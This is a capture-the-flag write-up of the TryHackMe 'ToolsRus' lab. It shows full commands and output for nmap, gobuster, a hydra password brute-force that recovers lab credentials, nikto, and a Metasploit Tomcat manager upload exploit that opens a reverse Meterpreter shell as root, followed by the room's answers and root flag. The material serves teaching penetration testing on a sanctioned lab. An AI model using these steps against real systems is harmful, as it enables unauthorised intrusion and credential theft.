---
id: 614
title: "ToolsRus | Tryhackme - write-up"
created: 2023-10-03T12:04:53+00:00
url: https://hacklido.com/blog/614-toolsrus-tryhackme-write-up
words: 4277
---

# ToolsRus | Tryhackme - write-up

[image]

This time on tryhackme we will be going to look at tool that prioritizes on using tools such as dirbuster, hydra, nmap, nikto and metasploit. This will be an easy, fun and interesting room to solve which warms up with basic tool usage of industry’s commonly used tools in pentesting. Now before we hack into machine, let’s scan it with nmap. Now on the previous write ups you would have seen me using rustscan, but realised it was developed  by someone who did not bother to read the manual and seems like we can achieve the same speed with the original tool itself. Source -

More on that latter but for now let’s scan as we have done in previous writeups, save it to an xml file and then using `xsltproc` convert into `.html` file for more easy viewing.

```
`
root@mccleod1290:~# sudo nmap --min-rate 4500 --max-rtt-timeout 1500ms -A -sS --top-ports 1024 --script=vuln -oX toolrus.xml --reason --stats-every 5s 10.10.12.11

Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-02 14:37 BST
Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:00:10 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 25.00% done; ETC: 14:38 (0:00:18 remaining)
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 86.85% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.65% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.68% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.68% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.68% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.87% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.87% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:38 (0:00:00 remaining)
Stats: 0:01:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:00 remaining)
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:00 remaining)
Stats: 0:01:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:01:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:01:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:02:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:02:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:02:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:39 (0:00:01 remaining)
Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:02:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:02:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:02:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:02:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:02:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:02:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:02:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:03:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:03:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.25% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:03:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:03:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:40 (0:00:01 remaining)
Stats: 0:03:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:03:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:03:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:03:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:03:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:03:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:03:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:04:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:04:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:04:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:04:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:41 (0:00:01 remaining)
Stats: 0:04:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:01 remaining)
Stats: 0:04:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:01 remaining)
Stats: 0:04:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:01 remaining)
Stats: 0:04:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:01 remaining)
Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:01 remaining)
Stats: 0:04:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:02 remaining)
Stats: 0:04:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:02 remaining)
Stats: 0:04:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:02 remaining)
Stats: 0:05:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:02 remaining)
Stats: 0:05:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:02 remaining)
Stats: 0:05:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:02 remaining)
Stats: 0:05:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:42 (0:00:02 remaining)
Stats: 0:05:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.43% done; ETC: 14:43 (0:00:02 remaining)
Stats: 0:05:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.62% done; ETC: 14:43 (0:00:01 remaining)
Stats: 0:05:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.62% done; ETC: 14:43 (0:00:01 remaining)
Nmap scan report for ip-10-10-12-11.eu-west-1.compute.internal (10.10.12.11)
Host is up, received arp-response (0.00044s latency).
Not shown: 1020 closed ports
Reason: 1020 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|_  /protected/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
1234/tcp open  http    syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-server-header: Apache-Coyote/1.1
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
8009/tcp open  ajp13   syn-ack ttl 64 Apache Jserv (Protocol v1.3)
MAC Address: 02:65:94:42:4F:E3 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms ip-10-10-12-11.eu-west-1.compute.internal (10.10.12.11)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 330.28 seconds
root@mccleod1290:~# sudo xsltproc toolrus.xml -o toolrus.html
root@mccleod1290:~# open toolrus.html
root@mccleod1290:~# `
```

Now let’s break down the commands shall we?

```
`sudo nmap --min-rate 4500 --max-rtt-timeout 1500ms -A -sS --top-ports 1024 --script=vuln -oX toolrus.xml --reason --stats-every 5s 10.10.12.11`
```

Now we specify the min rates of packets per-second to 4500. When asked chat-gpt it tells us that nmap uses adaptive scanning, which means initially scans slows and as the system or server responds it increases it’s rate. But that takes a while and since this is an an easy or beginner machine, let’s not waste our time. We will be sending by default 4500 packets per-second. Now by default `max-rtt-timeout` or the maximum time nmap waits to get response from a server/machine is 10 seconds, and by specifying it to 1500 milliseconds, we tell nmap to just wait for 1.5 seconds which works really well in our case.

So far in our scan or when using rustscan we never missed out any port or service. And since this is working so well, we will be continuing to use this command. The rest of the commands should be easy to follow along as it’s just an aggressive scan followed by stealth scan, and we are only scanning top 1024 ports or the well known and used ports only. We have set the script to vuln, which scans for vulnerability and we will be saving the output to `toolrus.xml`. The `reason` flag tells us an description of why nmap thinks xyz service or port is open or the reason on why it identifies a particular service or port. The `-stats-ever 5s` displays the status of scan every 5 seconds followed by our victim’s ip address.

Lastly using `xsltproc` we are simply converting the xml file into .html file for better readability.

### 1. What directory can you find, that begins with a “g”?

```
`root@mccleod1290:~# gobuster dir -u http://10.10.143.163/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.143.163/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/10/03 11:34:15 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/guidelines (Status: 301)
/index.html (Status: 200)
/protected (Status: 401)
/server-status (Status: 403)
===============================================================
2023/10/03 11:34:27 Finished
===============================================================`
```

Short answer is yes, and jokes apart. We will be using gobuster instead of dirbuster because CLI interface is so easy to use, instead of button clicks, and easy for me to write blog on. We have specified gobuster that you need to be in directory brute forcing mode using `dir` and then provided url using `-u` and word list using `w`.

```
`guidelines`
```

### 2.Whose name can you find from this directory?

Simply visiting the `guidelines`we get our answer !

[image]

```
`bob`
```

### 3. What directory has basic authentication?

From our gobuster output we see an special directory `protected`, hmmm what could it actually be?

```
`protected`
```

### 4. What is bob’s password to the protected part of the website?

Let’s fire up popular brute forcing tool called `hydra`. One can also use burp intruder but it’s quite slow and time consuming. We specify the user name using `-l` and password list location using `-P`. Don’t forget to include the target ip, followed by the authentication method you are planning to crack which is `http-get` followed by the web-directory which we are planning to perform password cracking which is `/protected`. If you have done everything right up to this point you should get the password.

```
`root@mccleod1290:~# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.143.163 http-get /protected
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-10-03 11:41:25
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.143.163:80//protected
[80][http-get] host: 10.10.143.163   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-10-03 11:41:28
root@mccleod1290:~# `
```

```
`bubbles`
```

[image]

Note that after entering password it should display a static page stating the webpage has been moved to somewhere else.

### 5.What other port that serves a webs service is open on the machine?

From our initial nmap scan, we can find our that in poer `1234` there is apache tomcat server hosted, which is indeed the answer for this task.

```
`1234`
```

### 6.What is the name and version of the software running on the port from question 5?

Simply visiting the port or referring to the initial nmap scan should give our answers.

```
` Apache Tomcat/7.0.88`
```

### 7.Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.How many documentation files did Nikto identify?

Now previously from out nmap scan we see that there is an open tcp port at 1234 which hosts Apache Tomcat/Coyote JSP engine 1.1 .Moving to `manager/html` it asks us to authenticate and trying out the previously found password combination it works like a charm.

[image]

Now we need to use the same authentication details on our nikto scan, we can do it using the `-id` flag, and don’t forget to mention the host which is going to our url using `-h`.

```
`root@mccleod1290:~# nikto -h http://10.10.143.163:1234/manager/html -id bob:bubbles
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.143.163
+ Target Hostname:    ip-10-10-143-163.eu-west-1.compute.internal
+ Target Port:        1234
+ Start Time:         2023-10-03 11:51:55 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ Cookie JSESSIONID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager interface found
+ /manager/html/WorkArea/version.xml: Ektron CMS version information
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-10-03 11:52:04 (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested`
```

```
`5`
```

### 8.What is the server version?

You can use ctrl+f to find server information from initial nmap scan. Note that the answer is asking a server not an open-source Java servlet container [tomcat] or a Connector component for Tomcat that supports the HTTP 1.1 and 2 protocol as a web server [which is coyote]. Thanks google for the definations!

```
`apache/2.4.18`
```

### 9.What version of Apache-Coyote is this service using?

Again our nmap initial scan has answer for this question.

```
`1.1`
```

### 10.Use Metasploit to exploit the service and get a shell on the system.What user did you get a shell as?

Now for this we will be using search command, but unlike others let’s not simply search `search tomcat` which results in lot of results.Let’s redefine the searches using `type:exploit` and `name:tomcat`. This should be obvious, as we are searching for an exploit module which is for tomcat server. Select the second exploit or the `tomcat_mgr_upload`, enter options required for the exploit and let it run! soon you should get meterpreter shell.

```
`msf6 > search type:exploit name:tomcat

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/http/tomcat_cgi_cmdlineargs          2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   1  exploit/multi/http/tomcat_mgr_deploy                 2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   2  exploit/multi/http/tomcat_mgr_upload                 2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   3  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc  2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
   4  exploit/multi/http/tomcat_jsp_upload_bypass          2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass

Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/http/tomcat_jsp_upload_bypass

msf6 > use 2
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
                                            using-metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host

Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.7.33       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Java Universal

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 1234
rport => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set rhost 10.10.143.163
rhost => 10.10.143.163
msf6 exploit(multi/http/tomcat_mgr_upload) > set httpusername bob
httpusername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword bubbles
httppassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.10.7.33:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying u9uS5EfFS8uuc4ImAHfZUp3S...
[*] Executing u9uS5EfFS8uuc4ImAHfZUp3S...
[*] Undeploying u9uS5EfFS8uuc4ImAHfZUp3S ...
[*] Sending stage (58851 bytes) to 10.10.143.163
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.7.33:4444 -> 10.10.143.163:48782) at 2023-10-03 12:08:12 +0100`
```

Now just type in shell, and type in whoami, you should see who you are in the victim’s server.

```
`root`
```

### 11.What flag is found in the root directory?

From here it should be a cake walk, simply searching around for the flag we should get the flag.

```
`ff1fc4a81affcc7688cf89ae7dc6e0e1`
```

[image]
